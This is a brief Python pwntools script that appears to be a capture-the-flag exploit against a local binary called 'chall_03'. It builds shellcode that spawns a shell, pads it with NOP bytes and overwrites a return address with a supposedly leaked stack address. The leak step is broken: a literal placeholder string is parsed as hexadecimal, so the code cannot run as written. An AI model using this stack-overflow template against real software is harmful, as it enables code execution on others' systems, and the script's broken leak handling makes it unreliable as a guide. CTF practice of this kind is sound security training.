from pwn import *
p=process("./chall_03")
p.recv()
_ = b'leak'
stack = int(_,16)
payload = b'' + asm(shellcraft.sh())
payload += (0x148 - len(payload)) * b'\x90'
payload += p64(stack)
p.sendline(payload)
